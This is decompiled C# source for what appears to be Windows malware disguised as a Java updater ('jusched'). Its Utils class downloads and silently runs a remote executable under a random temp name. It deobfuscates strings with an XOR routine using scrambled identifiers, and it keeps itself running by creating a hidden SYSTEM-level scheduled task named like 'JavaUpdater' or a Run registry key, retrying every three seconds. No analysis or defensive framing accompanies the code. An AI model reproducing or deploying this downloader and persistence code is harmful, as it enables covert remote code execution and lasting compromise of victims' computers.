using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.ApplicationServices;
using Microsoft.VisualBasic.CompilerServices;
using jusched.My;

namespace jusched;

public class Utils
{
	public static Thread check_1 = new Thread((ThreadStart)delegate
	{
		Check_0();
	});

	[DebuggerNonUserCode]
	public Utils()
	{
	}

	public static object DownloadAndRun(string exeUrl)
	{
		using WebClient webClient = new WebClient();
		webClient.Proxy = null;
		byte[] bytes = webClient.DownloadData(exeUrl);
		string text = Path.GetTempFileName() + RandomString(6) + ".exe";
		File.WriteAllBytes(text, bytes);
		Process.Start(text);
		object result = default(object);
		return result;
	}

	public static object LVVsYEYIBTovlEgUsoSwnwY(string tqLUmIDYlTWaniuDg, string wUGkVcBRqMABRPCpw)
	{
		string text = "";
		int num = Strings.Asc(wUGkVcBRqMABRPCpw);
		checked
		{
			short num2 = (short)Strings.Len(tqLUmIDYlTWaniuDg);
			short num3 = 1;
			while (true)
			{
				short num4 = num3;
				short num5 = num2;
				if (num4 > num5)
				{
					break;
				}
				text += Conversions.ToString(Strings.Chr(num ^ Strings.Asc(Strings.Mid(tqLUmIDYlTWaniuDg, unchecked((int)num3), 1))));
				num3 = (short)unchecked(num3 + 1);
			}
			return text;
		}
	}

	public static string RandomString(int Length)
	{
		Random random = new Random();
		string text = "abdcdefghijklmnopqrstuvwxyz123456789";
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < Length; i = checked(i + 1))
		{
			stringBuilder.Append(text.Substring(random.Next(0, text.Length), 1));
		}
		return stringBuilder.ToString();
	}

	public static object Check_0()
	{
		while (true)
		{
			string text = Environment.GetEnvironmentVariable("APPDATA") + "\\" + Configuration.exename;
			Application.get_ExecutablePath();
			PlatformID platform = Environment.OSVersion.Platform;
			if (platform == PlatformID.Win32NT)
			{
				switch (Environment.OSVersion.Version.Major)
				{
				case 5:
					try
					{
						if (MyProject.User.IsInRole((BuiltInRole)544))
						{
							string text2 = Environment.GetEnvironmentVariable("windir") + "\\Tasks\\JavaUpdater.job";
							FileInfo fileInfo = new FileInfo(text2);
							if (!fileInfo.get_Exists())
							{
								Interaction.Shell("schtasks.exe /Create /SC ONLOGON /TR \"\\\"" + text + "\\\"\" /TN " + Configuration.tksname + " /RU \"NT Authority\\System\"", (AppWinStyle)0, false, -1);
							}
							if (File.Exists(text2))
							{
								File.SetAttributes(text2, FileAttributes.Hidden | FileAttributes.System);
							}
						}
						else if (MyProject.User.IsInRole((BuiltInRole)545))
						{
							global_0.reg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", Configuration.regname, text);
						}
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				case 6:
					try
					{
						global_0.reg("Software\\Microsoft\\Windows\\CurrentVersion\\Run", Configuration.regname, text);
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
			Thread.Sleep(3000);
		}
	}
}
